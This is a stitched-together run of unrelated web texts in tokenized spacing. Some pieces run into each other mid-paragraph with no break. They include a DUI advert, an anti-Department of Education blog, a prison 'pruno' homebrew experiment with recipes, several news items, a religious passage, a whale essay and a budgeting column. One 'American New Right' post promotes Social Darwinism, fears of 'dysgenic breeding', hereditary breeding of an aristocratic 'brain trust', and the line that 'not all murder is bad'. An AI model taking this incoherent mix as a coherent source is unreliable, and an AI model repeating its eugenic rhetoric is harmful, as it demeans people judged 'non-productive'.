Challenge the Wide - Ranging Penalties of DUI Convictions
What you need to keep in mind is the full extent of how a DUI conviction can affect all areas of your life .
In addition to paying high fines and possible incarceration , even for a first - time DUI conviction , your driver ’s license will be suspended , usually for at least nine months .
Losing your driver ’s license for such an extended period of time will make it difficult to maintain employment , continue your education , meet child custody or visitation expectations , and so on .
The best chance to prevent your life from being disrupted entirely by a single DUI conviction is preventing that conviction in the first place with a powerful defense .
Last night with the Liberty Bell Center of Constitutional Studies , I was part of a panel answering questions on public education with the Concerned Citizens of Bethlehem Area School District .
The BASD has been plagued with financial troubles stemming from OTC derivatives purchases , and previously I gave an educational presentation to this group on financial derivatives .
After the lecture from LBCCS founder Paul Fiske who related how our founding fathers viewed education , Ryan Burgett , chairman of LBCCS and I ( as a member of LBCCS ) took questions and there was one question I was unable to answer without a projector , which was the breakdown of spending by the federal Department of Education , which is below or can be viewed online here .
I also gave a short synopsis of the history and issues I have with this Department .
For the first 177 years in American history , there was no federal Department of Education , which was reserved to the states and localities to handle as they saw fit .
This was also in agreement with the Constitution of the United States , which does not provide any justification whatsoever for federal power over education ; in fact , the 9th and 10th Amendments make such action both unconstitutional and illegal .
This changed in 1953 when Republican President Dwight Eisenhower created the Department of Health , Education , and Welfare .
Prior attempts by Presidents Harding and Roosevelt had failed .
This department has another black mark as it is the only one created solely by presidential authority without the permission of Congress .
The powers of this department continued to grow until Democrat President Jimmy Carter , envisioning a “ compassionate ” federal government , spun off the Department of Education ( known as ' ED ' ) in 1979 .
For close to the next 20 years , one of the major distinctions between the Republican and Democratic parties was concerned this department .
In the 1980s , President Ronald Reagan was in favor of abolishing the department , he was not able to do so .
As recently as 1996 , the Republican Platform read :
“ Because we trust our fellow Americans , rather than centralized government , we believe the people , acting through their State and local elected officials , should have control over programs like education and welfare – thereby pushing power away from official Washington and returning it to the people in their communities and states …
We support elimination of the Departments of Commerce , Housing and Urban Development , Education , and Energy , and the elimination , defunding or privatization of agencies which are obsolete , redundant , of limited value , or too regional in focus . ”
Under Democrat President Bill Clinton , ED continued growing from spending of $ 32 billion in 1992 to $ 38 billion in 2000 .
However , ED received its fastest growth under Republican President George Bush II .
From 2000 until 2008 , Bush II more than doubled the budget , from $ 38 billion to a maximum of $ 100 billion spent in 2006 with spending plans like “ No Child Left Behind . ”
[ link edited for length ] :
$ 68.5 billion spent by the Department of Education in total
$ 24 billion spent on post - secondary education , including many loans to college students
$ 38 billion spent on elementary and secondary education
$ 5.6 billion spent in what can best be described as ' R&B ' – research and bureaucracy
Now , spending lots of money on education may seem like a good thing to the uninformed , but there have been no tanglible results over the past couple decades , if anything the exact opposite .
Why is this so ?
Well , besides the wasteful spending on bureaucracy , a few points :
Similar to health care best being dealt between doctors and patients , education is best handled on the local level between parents and teachers .
Both health care and the education of children are very important .
Remember that when a Washington bureaucrat 's authority over the spending of funds is required , it is the child who suffers .
Federal mandates on education has the effect of stifling local diversity and choking off competition .
What we want is a healthy competition of “ 50 laboratories ” from state - to - state and between local areas , not a universal “ one - size - fits - all ” education .
The more self - rule and autonomy by local communities provides local diversity and overall greater satisfaction for individual families .
The redistribution and control of federal funds ( and certainly also on the state level ) to localities makes local areas subservient to bureaucrats , even though , in most cases these are the exact same funds the taxpayer paid in to the federal and state governments .
More local autonomy over funds increases both the efficiency and self - ownership over the spending of these funds .
It is also far easier for a parent to hold a local school board official accountable if this official is entrusted with all of the necessary responsibilities .
Local communities that wanted to spend more on education could do still so , through either local taxation or – if one thinks outside the box for just a moment – fundraisers , fairs , and PTAs .
While Perkins Loans and Pell Grants for the purpose of college education seem like the greatest invention since sliced bread , their overall effect is to put bureaucrats in charge of the decisions in who receives which loans .
Ever hear a parent complain about the cost of their kid 's college tuition ?
By flooding the market with credit , these government programs lead to colleges to both charge more and also become less efficient on fund allocation .
[ Note :
The money - printing of the FED ( inflation ) is another root cause of rising tuition costs , to learn more read here . ]
The Department of Education is one of many federal departments that , if they were to be abolished and disappeared off the face of the earth tomorrow , almost no one would notice .
The bureaucrats all would have to seek healthy new jobs providing goods or services in the private economy .
The grant and loan programs could all be halted and existing accounts closed out .
A final point in closing : one should keep in mind that ED 's budget of $ 68 billion dollars is sufficient to pay for the entire core federal government .
We could pay for all of these federal government departments : the US House , US Senate , the White House 's staff , the Supreme Court , FBI , and the federal court system .
Hmmm … just another reason why we do n't need a federal income tax .

Jake Towne's Plank on the Federal Reserve
Alcohol has been with us since the beginning of civilization , in the best and worst of circumstances .
It has survived countless attempts to limit and ban it and , through man ’s ingenuity , it has prevailed .
No matter what the situation , men have always found a way to beg , borrow , steal or manufacture their own alcohol .
Nowhere is this irrepressible spirit more evident than in prison .
Which makes sense .
Alcohol is great for stress , after all , and there are fewer stressful environments then lockup .
Homemade prison alcohol goes by the a multitude of names , including juice , jump , raisin jack , brew , chalk , buck , hooch , and pruno ( a once popular ingredient was prunes , but the name now applies to any fruit - based homebrew ) , and the industry probably started flourishing about a week after history ’s first prisoner was led to his cell .
And try as they may , the Man has never been able to stop it .
It ’s become such an entrenched part of the culture of incarceration many wardens have accepted it as part of the gig .
Reggie Kray , of the Kray brothers , England ’s most infamous crime family , was recently denied parole after 29 years in prison because “ he had failed to refrain from drinking alcohol in prison . ”
He refuses to stop and the authorities apparently can’t make him .
So he remains in prison .
Drinking .
It ’s nearly impossible to stop because , one , the prisoners will go to great lengths to get it , and two , alcohol is remarkably easy to make .
All you need is a little knowledge , something that will ferment , and time .
And there ’s plenty of all three in any prison .
Most recipes involve fresh fruit and wardens at some prisons have went so far as to ban fruit from prisoners ’ meals in hopes of curtailing production .
The convicts , ever resourceful , were later found to be making pruno from cake frosting , bread , jelly and milk .
Which goes to prove , where there ’s a will , there ’s a way to get smashed .
To discover how easy it is to make pruno , we assembled two teams to attempt separate recipes .
The first is a proven classic , the second a modern variation .
Recipe # 1 : Classic Pruno ( by Hank Soboski )
This recipe is part of prison folklore to the extent it was described in detail in a famous poem called Recipe For Prison Pruno by prison poet Jarvis Masters .
( See bottom of page . )
Using nothing but the poem for reference , I proceeded .
What You ’ll Need :
A Sealable Bag ( Ziploc or a heavy - duty garbage bag with rubber bands )
10 Peeled Oranges
1 8oz Can of Fruit Cocktail
50 Sugar Cubes
6 Teaspoons of Ketchup
Tap Water
Day 1
I combined the oranges and fruit cocktail in a large Ziploc bag , sealed it tightly , then spent fifteen minutes squeezing and mashing it lovingly until it was the consistency of a pulpy paste .
I added 16 ounces of tap water and resealed the bag .
I ran hot water over the bag for fifteen minutes , then wrapped it in three towels to insulate the heat and start the fermentation process .
The bag ends up being the size , weight and temperature of a newborn infant and you may start having tender feelings for the cute little beast .
This is normal .
Especially when this realize when this baby grows up he ’s going to get you drunk .
I hid my baby in safe , dark place and let it sit undisturbed for forty - eight hours .
Day 3
I unwrapped the towels to discover my baby had ballooned up nicely .
This , I surmised , was due to the gasses given off by the fermentation process .
I opened the bag and it gave off a light scent of , well , rotting fruit .
I added fifty cubes of sugar and six packets of Heinz Ketchup .
After resealing the bag , I waited for the sugar cubes to dissolve , then kneaded the pulp a little to ensure a good mix .
It struck me that I could have very well used uncubed sugar .
I ran it under hot water for thirty minutes to make things pleasant for the bacteria , then rewrapped my baby in towels and put it back in a safe dark , place .
Day 4 and Day 5
I kept a close eye on my prodigy .
The sugar accelerated the fermentation process and by Day Five it looked as if my baby was thinking about exploding into something I did n’t care to clean up .
I opened a corner of the bag and let off a little gas .
Day 6 through Day 8
I reheated the bag in the sink for fifteen minutes every day , then rewrapped it in towels .
I noticed a floating colony of mold that had taken up residence was growing very nicely .
Was my baby sick ?
Was this normal ?
Was there no hotline I could call ?
I put it back in its safe place and hoped for the best .
Day 9
Gripped by a mixture of anticipation and dread , I unwrapped the bag and opened it .
As a precaution , I had scented toilet paper stuffed up my nose , but the bouquet still came on like a rotten gauntlet across the snout .
My baby had mutated into some form of Frankenstein creature with very bad personal hygiene .
I quickly ladled out the large pieces of rotten fruit and the spectacularly successful mold colony , then strained the remainder through a tea strainer .
The Taste Test
I had to fight hundreds of thousands of years of human evolution and instinct to get down the first swallow .
Even with my nose stuffed with toilet paper , my first instinct was to vomit out what my lizard brain told me was deadly poison .
But I remembered that I reacted the same way to my first taste of whiskey and carried on .
I fended off the idea of mixing it — with drain cleaner , gasoline , anything .
I forced down a cup ’s worth , expecting it to eventually get easier .
It did n’t .
Each new swallow was a fresh insult .
I added ice in hopes it would mask the taste or at least kill some of the bacteria .
Aside from tasting like moldy and rotted fruit , it tingled against my tongue as vast bacteria colonies rose up and counter - attacked .
When I ’d fought and gagged my way through half the first pint , my stomach started rebelling .
I could imagine what it was thinking : “ Great God , we ’re being poisoned !
And , get a load of this shit , the fucker keeps sending more down !
Are we committing suicide ?
Did I miss a fucking meeting ? ”
To put it bluntly , classic pruno tastes like a bottle of Thunderbird filtered through a dumpster full of rotted garbage .
Also , a stray dog laps it up from the alley floor and vomits it into a dirty hubcap .
Did it get me drunk ?
A pint of pruno earned me a mild buzz .
Not a “ snifter of brandy on the balcony ” buzz .
But rather a wretched , stomach - churning , sour - mouthed buzz .
The equivalent of back alley sex with a toothless crack whore .
It ’s sex , yes , but you feel more horrified than satisfied .
I ’ve never felt a great deal of sympathy for our nation ’s prisoners , but I do now .
Recipe # 2 : Rich ’s Orange Jack ( by Nick Plumber )
I acquired this recipe from a recently paroled friend of mine , Rich , who ’d experimented extensively with cell - brewing while serving out his debt to society .
What You ’ll Need :
A Sealable Bag
3 Containers of Orange Juice Concentrate
1 ½ Cups of Sugar
3 Dinner Rolls
Tap Water
Day 1
The dinner rolls , Rich informed me , are are added for their yeast content , which explains why this recipe takes a third less time than the classic v ersion .
While incarcerated he ’d mixed this mash in a trash bag ensconced inside a plastic jailhouse footlocker .
Lacking such , I used a trash bag and a five - gallon plastic bucket .
I combined all the ingredients and I tied off the bag leaving plenty of room for the gasses to expand into .
According to Rich ’s system I would let it sit for five days , “ burping ” the bag once a day to let off the gasses .
Rich suggests that the best time to do this is right after lights out , since the guards wo n’t be by for a while and the odor of fermenting juice is pungent and unmistakable .
Day 2
I did n’t notice much activity .
The bag was n’t filling up with carbon dioxide and I fretted that I had n’t added enough sugar to get the yeast kick started .
I decided to be patient .
Day 3
The bag was slightly swelled , but not enough for me to burp it .
Day 4
The bag was starting to bloat , so I opened it slightly and squeezed .
A strong smell , like a screwdriver with the hint of rising bread , filled the room .
According to Rich , this was a good sign .
Day 5
I burped the bag again .
The odor was getting very sour .
Rich had warned me of this , so I added another ½ cup of sugar and retied the bag .
Day 6
The moment of truth .
I assembled a panel of tasters , opened the bag and peeked inside .
A foamy mess of soggy bread floated on top of a thick orange liquid .
In the interest of keeping the procedure as authentic as possible , we strained the brew through an old t- shirt .
We served it on the rocks with a twist of morbid dread .
The Taste Test
Ivan , after smelling it , refused to drink it until we called his manhood into question .
He had a sip , ran straight to the bathroom and threw up .
Not a good sign , to be sure , but the rest of us were made of sterner stuff .
It smelled like rotten underwear and looked like Satan ’s venereal urine , but this was for drunkard science , by God .
Counting to three , the remaining tasters and I took a drink simultaneously .
We grimaced in unison .
It tasted exactly as bad as it looked and smelled .
Like a screwdriver that ’d been sitting in the sun for a week .
Baker put his down and refused to have another drink .
Dignan took one more tiny sip , shuddered and surrendered .
Which left it all up to me .
Bracing myself , I downed the rest of the glass .
Remarkably ,
It stayed down .
I sensed that there was a decent amount of alcohol in it but was there enough to give the kind of buzz that would make me forget a five to ten year stretch of hard time ?
Sneering with disdain at the shattered panel of tasters , I calmly filled another glass .
In the big house they would all be my bitches .
I added more ice and let it sit for a moment — chilling it could only help .
I tried to put myself in the mental state of a prisoner : I have n’t had a drink in months or longer , and this is all there is .
There are no liquor stores , no bars , no bottles of scotch hidden under my roommate ’s bed .
Nothing .
Just monotony , brooding danger and a powerful urge to get out of my head , even for just an hour .
I expelled all my breath and sucked down another glass .
Vinegary , yeasty , with a rusty shank of an aftertaste .
I was feeling a slight buzz , but I did n’t think I could stomach another glass .
It was booze all right , but two glasses was my non-incarcerated limit .
To reward myself I poured a nice glass of whiskey to wash my mouth out and ruminated upon the experiment :
It works , yes , but I would n’t recommend trying it in any but the most desperate of conditions .

Here 's the clip from TPM with the call to David Brooks .
I think I found another clip with the same man .
I knew that voice sounded familiar .

Google has criticised the Australian government 's forthcoming mandatory ISP censorship system for targeting a " too wide " a range of content .
While supporting blocking of child abuse material , Iarla Flynn , Google Australia 's head of policy today wrote that " moving to a mandatory ISP filtering regime with a scope that goes well beyond such material is heavy handed and can raise genuine questions about restrictions on access to information " .
Google said its intervention was motivated by its " bias in favour of people 's right to free expression " .
The Australian government yesterday announced laws to impose the filters , following trials .
As well as child abuse material , the Australian filters will block " bestiality , sexual violence , detailed instruction in crime , violence or drug use and / or material that advocates the doing of a terrorist act " .
The blacklist will be drawn up by the Australian Communications and Media Authority , which also regulates broadcasters .
Citing instructions for safer drug use and sites about euthansia as examples of content that may be blocked , Flynn wrote : " This type of content may be unpleasant and unpalatable but we believe that government should not have the right to block information which can inform debate of controversial issues . "
Google 's influential voice adds to opposition to the laws , which has united civil libertarians , ISPs and the Australian Sex Party .
Commmunications minister Stephen Conroy , who has driven the filtering scheme , has so far dismissed concerns however .
He is backed by Christain groups .
Conroy said popular comparisons with China 's Great Firewall , which is used to suppress dissent online , are " baseless " .
Google 's principled criticism makes no such comparison , despite the fact that China is a massive emerging market for its search engine . ®

The ' banana wars ' have been raging for 16 years
The European Union has agreed a deal to cut tariffs on banana imports , signalling the end of the world 's longest - running trade dispute .
Banana producers in Latin America will be subject to lower EU import tariffs as a result of the deal .
This should make them more competitive with producers in Africa and the Caribbean , who pay no tariff .
The price of bananas could fall by 12 % as a result .
The formal agreement will be signed in six to nine months ' time .
Duty on imported bananas will be cut from 176 euros ( £ 158 ; $ 256 ) per tonne to an initial 148 euros ( £ 133 ; $ 215 ) .
Further cuts will be made on an annual basis over the next seven years to 114 euros per tonne .
The deal was being " initialled " in Geneva on Tuesday afternoon by the various trade representatives .
" I am delighted that we have finally found a way to solve the bananas dispute with a compromise that works for all sides , " said European Commission President José Manuel Barroso .
" This is an important boost for the multilateral system " .
Long - running dispute BANANA WARS : STORY SO FAR 1993 : EU imposes first Europe - wide tariffs on banana imports from non-APC countries 1996 : Ecuador leads Latin American countries in complaining to the WTO about the tariffs 1999 : WTO allows US trade sanctions on EU exports for the first time after declaring banana tariffs illegal 2000 : A new EU deal on tariffs is rejected by the US 2001 : Banana war declared " over " as US - EU deal is struck on tariffs promising change by 2006 2005 : Proposed new EU banana tariffs declared illegal by WTO , following complaints 2006 : Ecuador again complains to the WTO 2008 : EU tariffs again declared illegal by the WTO , upholding the latest complaints from Ecuador and the US 2008 : EU trade commissioner warns that global trade deals at risk due to banana wars 2009 : EU signs new deal with Latin American producers , fuelling new hopes of an end to banana wars Q&A :
The banana wars Analysis : Fruits of world trade
The agreement potentially brings to an end the banana wars trade dispute which began 16 years ago with the establishment of European tariffs on banana imports .
But the origins of the discrepancy go back far further to European colonialism .
In 1975 former Caribbean countries were given a generous import quota .
The BBC's Europe business reporter Nigel Cassidy says the idea was to enable the economies of former European colonies or dependencies to grow independently without recourse to overseas aid .
However , Latin American banana producers , together with the US , have long complained that the system is unfair .
This view has been supported by the World Trade Organization ( WTO ) , which has declared the banana tariffs illegal .
Although not a banana producer itself , the US is home to some of the biggest banana producers operating in Latin America , including Del Monte and Dole .
Compensation package
The move is likely to disadvantage the banana industries in Africa , the Caribbean and the Pacific ( known as the ACP countries ) , who do not pay tariffs on imports to the EU .
Many of them have economies heavily reliant on banana production , and rely on the EU tariffs to secure them access to the European market .
Errol Emmanuel , acting manager of Dominica Banana Growers Limited , told the BBC World Service the agreement would hit poor farmers in the Windward Islands hardest : " These small farms are family owned .
You have husband and wife and maybe one or two helpers ... they do n't have the resources to compete with the Doles and the Del Montes , who own vast tracts of land . "
A compensation package for Dominica and the other ACP countries , worth 200 m euros , is included in the deal .
The European banana market is the largest in the world , with 5.5 million tonnes of the fruit imported last year .

Richard Sandomir of the New York Times postulates :
Versus ( and its sister network , the Golf Channel ) will be turned over to NBC for an overhaul , assuming regulators approve the deal , a process that could take 12 to 18 months .
Versus will probably be renamed something like NBC Sports Cable to reflect a more defined sports brand .
On-air and production talent would migrate from NBC , to a certain extent , although Bob Costas would not be hosting IndyCar races .
Versus and Golf would certainly be overseen by Dick Ebersol , the chairman of NBC Universal Sports , who has never had a sports cable network to tinker with ( the expanding Universal Sports channel is distributed through NBC stations and affiliates ) ; he would no doubt quickly strip Versus of its current crop of late - night infomercials .
But beefing up Versus ’ quality and appearance is a small part of getting part of ESPN ’s business .
Comcast would have to decide to spend what is necessary to lure viewers from ESPN and ESPN2 by acquiring bigger events , like the Olympics , Major League Baseball , the N.F.L. , Nascar and the N.B.A. — properties on a tier above its current rights to IndyCar , the Professional Bull Riders , Mountain West Conference football and mixed martial arts .
GHC 6.12.1 only works with Cabal - install version 0.8 or later .
Please upgrade if you have an older version of cabal - install .
If you have installed a standalone GHC before and are upgrading to 6.12.1 , note that this release of GHC comes with fewer packages than before .
The extra packages have to be installed separately .
For most users , we recommend installing the Haskell Platform instead of GHC .
The current Haskell Platform release includes a recent GHC as well as some other tools ( such as cabal ) , and a larger set of libraries that are known to work together .
The GHC 6.12.1 release is aimed primarily at package maintainers and early adopters .
GHC is packaged for a number of operating systems and distributions .
While they may lag behind the latest GHC release , advantages such as dependency checking and ease of uninstallation mean we recommend using them anyway , unless you have a particular need for new features or bug fixes .
The OS - specific packages ( eg. RPMs on Linux ) are generally a better bet than the vanilla .tar. bz2 binary bundles , because they will check for dependencies and allow the package to be uninstalled at a later date .
However , if you do n't have permission to install binaries on your system , or you want to install somewhere other than the default place ( / usr or /usr / local on a Unix system ) , then you 'll need to use a .tar. bz2 binary bundle .

As of December 17 , Fedora 10 has stopped receiving support ; there will be no more security updates for this distribution .
In fact , the final updates went out on the 11th ; among other things , that means that the latest Firefox vulnerabilities will not be fixed .
Fedora 10 users should probably be thinking about moving to a more recent release .

And , because of the Incarnation , Life , Death , and Resurrection of Our Lord , we , too , have been ransomed .
Christ ’s coming to Earth began the victory march that eventually overthrew the gates of hell and won the victory over Satan .
So when this corruptible has put on incorruption , and this mortal has put on immortality , then shall be brought to pass the saying that is written :
“ Death is swallowed up in victory . ”
“ O Death , where is your sting ?
O Hades , where is your victory ? ”
by Brett Stevens on December 27 , 2009
Since the last post generated some interesting discussion wherever it showed up on the internet , here ’s a few more ideas — in the form of “ how the American New Right is different from other movements ” :
Republican
Abortion and Assisted Suicide .
We ’re not concerned with regulating the sexual morality of women through laws .
Our view is that we should reward good behavior and avoid society paying for the consequences of bad behavior , which has a natural “ Social Darwinist ” regulatory function .
Abortion may be murder ; not all murder is bad , if the person murdered would not have a place .
When people are terminally ill or terminally depressed , let them go .
We have enough humans .
We need more good humans .
Stem Cells and Science .
“ Science is the answer ” is not the answer , because science is applied by individuals and corporations with profit motive , and so is the most politically - swayed discipline currently in existence .
We want to take this pressure off of science and depoliticize it , allowing research — but then determining carefully what we apply to the broadest segments of society .
Cradle - to - Grave recycling .
Many Republicans resist all Green initiatives because Greens are generally ( a ) leftist and ( b ) oblivious to consequences outside an abstract ideology not parallel to reality .
However , this is just a common sense move : charge a small value added tax to purchase recycling and land reclamation projects from free market sources .
Urban renewal .
End rent control and other well - intentioned but failed policies for regulating our cities .
Do n’t let people sit on undeveloped properties in downtowns , and start arresting and removing the criminal element so we can redevelop these urban centers and stop wasting gas on commutes from the suburbs and exburbs .
Homosexuality .
It ’s not an issue for us .
While we find divisive political movements like feminism and queer rights to be counterproductive if not outright destructive , and while we defend the right of communities to define what behaviors they will and will not tolerate , we feel that a healthy society does not need specific policies for homosexuals .
Socialism .
Government has a palette of methods to address a given situation ; for many things , collectivization is a good idea .
We accept it for roads and other infrastructure items .
In some cases , a socialist approach can be helpful , as in education .
What we will not do is cripple our most productive people in order to subsidize the least productive , criminal , low intelligence or mentally dysfunctional .
Church and State .
We like the idea of religion , government and culture sharing the same values as this is the best way to bring together a nation .
However , we do n’t like Prayer in Schools just like we do n’t like Jimmy Has Two Daddies in schools — religion needs to be de-politicized and politics , de-religionized .
Democrats
Post - inequality politics .
Instead of chasing the impossible , and then being manipulated by oligarchs and panderers who portray themselves as defenders of the common man or the equality of the masses , establish wisdom and competition and nurture the good .
Further , we should call the Democrats out on what they ’re doing with our immigration policy , which is importing voters who because they cannot ethnically join the majority will always be opposed to it .
Social roles .
Per their mania for egalitarian ideology and class warfare , Democrats are hesitant to allow any “ privileged ” social roles to exist — which then creates a situation where these roles are determined purely by wealth and popularity .
Media tax .
Media changes minds cheaply , and where that media has political intent , it should be taxed proportionately to make it less of a cheap work - around to acting within the existing political system .
We need fewer armchair people informed by political “ comedy ” shows , and more people active in local politics .
European New Right
Puritanism .
Or rather , a drive toward sobriety and chastity .
Europeans tend to mock American “ puritanism ” without realizing that these rules are common sense .
People who use recreational intoxicants substitute those for an ability to socialize and appreciate life , and become psychologically dependent ; people who engage in casual sex devalue their ability to appreciate partners as more than bodies , and so damage society ’s conception of family , leading to dysgenic breeding .
Libertarianism .
Much as in the palette of government methods , socialism is sometimes the best option , so also libertarianism is .
Bureaucracies will never be as flexible or responsive or inexpensive as free market forces ; even worse , bureaucracies can only be changed through a laborious political process or going through more bureaucracy , which makes them immune to critique except through carefully - edited “ audience response survey ” types of internal action .
Wherever we can , we should replace government agencies with market forces .
Social Darwinism .
Many from the European Socialism - conditioned side of things do not like to see this , but we embrace competition through the market .
Let those who are more competent be more productive and be rewarded more , and under no circumstances should we go out of our way to subsidize the non-productive — no matter how ideologically correct they may be .
We support job insurance and health insurance as private market options purchased in bulk by the state and resold to citizens , and we support some “ socialist ” subsidies for artists and thinkers , but maintaining healthy competition is essential to our viewpoint .
And a couple of differences that make us stand out from all of them :
Aristocracy .
We support the maintenance of hereditary aristocracies of the people with the best all - around judgment that we find , so that we may breed a brain trust among us .
They do not necessarily have to supplant other forms of government , but should exist as thought - leaders in their communities .
Wise old people .
In each local community , which ideally would have low ingress and egress rates , we support the idea of taking the older , wiser , and through their lives most productive people and learning from them .
A council of elders that knows its citizens by name and history , and can help them through difficult decisions , makes more sense than an impartial but also know - nothing bureaucracy .
These ideas are probably too much for our readers already , because they run contrary — in part — to the fundamental ideals of a modern time .
However , they ’re worth considering as we ’ve seen no coherent logical arguments against them and historically , they offered great benefit .
From a reader on Facebook :
I think “ diversity ” when not rammed down our throat , is GOOD for a society as it brings new ideas and fresh energy to a society .
If we ’re all equal , then diversity brings nothing new that cannot come from a study of other cultures .
If we ’re not all equal , then we need to make sure we group people of similar abilities and inclinations as created by the specific evolutionary paths of their ancestors .
This user was brave to post our earlier missive to his Facebook friends , and we advise him to maintain his position , so he does n’t endanger himself and his family by having taboo political positions — it ’s up to us to suggest the logical corrections above .

WARSAW , Poland —
Poles heading out to do last - minute Christmas shopping should give any Che Guevara T - shirts a wide berth as a new Polish law threatens anyone who produces or propagates communist symbols with two years in prison .
The legislation has caused outrage among Poland 's ex-communist Democratic Left Alliance ( SLD ) party , which plans to challenge the law 's constitutionality before the end of the year .
But it is worrying everyone from collectors of communist memorabilia to restaurateurs with increasingly popular themed eateries recalling Poland 's communist past .
“ I have some advice for the creators of this legislation , they should take the hammer , a symbol of the USSR , and whack themselves in the head , ” said Slawomir Kopczysnki , a member of parliament for the SLD .
Even the governing Civic Platform party seems confused about the new law , passed in late November , which sets the same penalties for propagating fascist symbols .
Janusz Palikot , one of the party 's leaders , said that his party had “ gone crazy , ” even though he himself had voted for the bill .
The new law is part of a long - running attempt by central European countries that suffered for decades under communism to treat its symbols in the same way as those of Nazism .
Many European countries , including Poland , make it a crime to propagate Nazi images , and works like Hitler 's Mein Kampf are frequently banned .
The general aversion toward anything that could be seen to glorify the Nazis even extends to toys .
In Europe , model airplanes of German wartime fighters and bombers do not have swastikas on their tails , which were part of their actual markings .
“ I once went to a model show with an airplane where I had painted on the swastika and I was thrown out , ” said the owner of a Warsaw modeling store .
But the revulsion felt toward fascism and Nazism is very different from how communist symbols are viewed .
Tourist shops in cities like Warsaw and Prague sell fur caps adorned with red stars .
There is no similar trade in Nazi Party armbands .
The European Parliament has established Aug. 23 — the anniversary of the date of the signing of the Ribbentrop - Molotov pact between Nazi Germany and the Soviet Union that paved the way for World War II — as the European days of remembrance for the victims of Stalinism and Nazism .
But trying to equate the two totalitarianisms is proving to be a tough slog .
Part of the reason is that the Nazis are treated as uniquely evil .
Although communism imposed decades of dictatorship , the communists ' rule was milder than the murderous rampage of Nazi Germany .
Although Poland spent 45 years under communist rule , the system still has its supporters .
In a recent newspaper debate , Slawomir Sierakowski , the editor of a left - wing journal , noted : “ It is impossible to think about Nazism without thinking of the Holocaust , while it is possible to think of Communism without the Gulag .
The communist idea arises from wholeheartedly positive intentions . ”
Nationalist Poles have a hard time stomaching that view .
Radoslaw Sikorski , Poland 's outspoken foreign minister , recently called for Warsaw 's Palace of Culture , a 1955 gift from Josef Stalin to the Polish people that remains the Polish capital 's tallest building , to be demolished and replaced with green space .
But despite Sikorski's appeals , the Palace of Culture has stood for 20 years since the end of communism , and , as it has recently been declared a historic monument , is likely to continue standing for some time to come .
Its resilience is a sign that , despite the new anti-communist law , Poles do not equate communism with the horrors of Nazism .
Another sign of acceptance can be found on the streets of almost every Polish city and town .
In the first years after 1989 , hundreds of street names were changed : Streets named after communist heroes like Vladimir Lenin and Felix Dzerzhinsky , the founder of the Soviet secret police , were renamed after Polish icons like Pope John Paul II .
But in recent years the impetus to root out communist names has faded and Poles are reluctant to undergo the hassle of changing addresses , street signs and documents .
In Warsaw , one of the capital 's main thoroughfares still bears the name of the People 's Army , while the western city of Gliwice still has a Karl Marx Street .
The issue of stamping out communist symbols remains important to the nationalist right — particularly for Law and Justice , the leading opposition party — and to the ex-communist left , which is fighting to preserve the symbols of the state it once served .
But a generation after the fall of communism , the topic is an increasingly esoteric one for most Poles .

Fort Bragg , with a population of 7,000 , is a ragged former timber town on the northern reaches of the California coast .
It is in some ways the epitome of idealised small town America : the kind of town where any small happening is news , where the story of any event acquires a mythology almost before it happens .
When a blue whale was struck and killed offshore by the research vessel Pacific Star and drifted into an isolated cove just south of the city limits , she quickly acquired her own story and a name , The Whale , or The Smell , as my father started calling her when the stench of decay drifted into his nearby living room .
He invited me over to smell for myself , but I politely declined the 10 - minute drive .
News outlets were quick to pick up the story .
Initial reports that she would be left to break down naturally were replaced by news that a team of volunteers , supervised by a Humboldt State University biologist , would section the body so that it could be winched up the cliffs .
Local companies donated heavy equipment for the task , a composting facility offered to compost the blubber and enterprising local youths sold tickets to would - be spectators who came to gawk and left disappointed when they learned that the cove was in an inaccessible gated community .
Much to the relief of wealthy weekenders who quailed at the thought of having their ocean views replaced with a panorama of decaying whale , the removal effort went quickly .
The blue whale is an endangered species , necessitating strict rules about the handling of remains , and the process was meticulously documented .
This narrative is captivating , but it is only one aspect of the story .
Almost immediately , accusations of negligence on the part of the Pacific Star 's crew emerged , with rampant speculation about the circumstances in which The Whale was struck .
All evidence suggests that they did nothing wrong .
In fact , the only reason we can confirm the cause of death is because the crew reported the incident , but it brings up a larger discussion about oceanographic research .
Fort Bragg is on a known whale migration route , and it's whale season .
Some people questioned whether the Pacific Star should have been out at all , given the risk of whale strikes , and others wondered about the protocol observed by research vessels in waters frequented by whales .
Ironically , the boat was on a surveying mission to update National Oceanic and Atmospheric Administration maps , which will be used to designate new marine protection areas .
This later proved to be another point of contention , with some whale advocates claiming that the echo sounding equipment used by the research vessel might have caused acoustic trauma that could have disorientated the animal .
Fisheries advocates also protested at government interference in Fort Bragg 's offshore waters , once one of the most productive marine ecosystems in the world , now heavily overfished .
A cynic might say that the government should have stepped in before we fished to the brink of collapse .
This is the second ship strike and death to occur this year in California 's waters , although we 're still short of the record four deaths in 2007 .
Estimates on the number of blue whales left alive vary , but the numbers are low enough that any ship strike is a tragedy .
These incidents have raised questions about the need to balance science with the creatures it is trying to save , and have illustrated the growing struggle over the right to use California 's offshore waters : who has precedence ?
The whales , or the growing commercial , scientific , and recreational ship traffic ?
Meanwhile , the whale 's remains are buried in an undisclosed location in the forest , to let microbes do the work of cleaning the bones .
Eventually , they will be mounted for display in a marine education facility which currently exists only in the imagination , much like the glory days of Fort Bragg 's now moribund fishing and timber industries .
The smell still lingers .
When you pay for something with a credit card , or even a debit card , you can easily spend a few extra dollars here and there .
But as Ramsey explained — while waving a handful of hundred - dollar bills to illustrate the point — if you have to actually hand over some of your dwindling cash supply , you tend to ponder every purchase .
That impulsive latte buy becomes a little less enjoyable when every time you haul out your wallet , a quavering voice inside your head asks , “ You want to send Uncle Abe away ? ”
And sure enough , though we thought we ’d budgeted conservatively for just the necessities , we nonetheless finished the month with extra money in every envelope .
It ’s also hard to spend cash , because so many people look at you funny when you try .
The very first day , I spent almost 20 minutes trying to check out in the “ better dresses ” section of a department store .
The saleslady stared at the hundred - dollar bill in her palm as if I ’d just handed her an eel .
After a series of plaintive looks at my obviously card - free wallet , she started stabbing at the cash - register keyboard with a sort of bleak despair .
To my immense surprise and relief — and clearly , also to hers — the cash drawer eventually opened .
Ramsey calls this “ being weird . ”
The phrase came up over and over again in his five - hour spiel , always punctuated with the same rejoinder : “ Normal is broke . ”
During our first month on the Dave Ramsey program , I was startled to find out how true this is .
When I described my project , a really shocking number of people , many of them married professionals with good incomes , confessed that they had no control over their money .
They are n’t much different from most of America .
According to a recent survey from CareerBuilder , six of every 10 workers “ always ” or “ usually ” live paycheck to paycheck .
Affluent , educated people do a little better , but they certainly are n’t immune — three in 10 of those with salaries above $ 100,000 also report that they ’re spending it as fast as they make it .
In fact , in some ways , education makes living above your means easier .
